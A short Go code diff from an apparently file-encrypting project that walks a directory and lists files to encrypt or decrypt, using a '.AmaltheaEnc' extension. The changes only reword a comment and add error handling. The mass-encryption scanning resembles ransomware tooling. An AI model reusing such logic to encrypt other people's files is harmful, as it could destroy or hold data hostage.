@@ -44,7 +44,7 @@ func (f *Files) ScanToEncrypt() ([]string, error) {
 		if error != nil {
 			return error
 		}
-		// HasSuffix looks for encoded files.
+		// HasSuffix looks for already encoded files.
 		if !strings.HasSuffix(path, ".AmaltheaEnc") {
 			if !stat.IsDir() {
 				// Checks the file is below maximum file size in bytes defined by `size`
@@ -69,7 +69,11 @@ func (f *Files) ScanToEncrypt() ([]string, error) {
 func (f *Files) ScanToDecrypt() ([]string, error) {
 	var files []string
 	err := filepath.Walk(f.rootDir, func(path string, info os.FileInfo, err error) error {
-		stat, _ := os.Stat(path)
+		stat, error := os.Stat(path)
+		// If there's an error, catch it
+		if error != nil {
+			return error
+		}
 		if !stat.IsDir() {
 			if strings.HasSuffix(path, ".AmaltheaEnc") {
 				files = append(files, path)
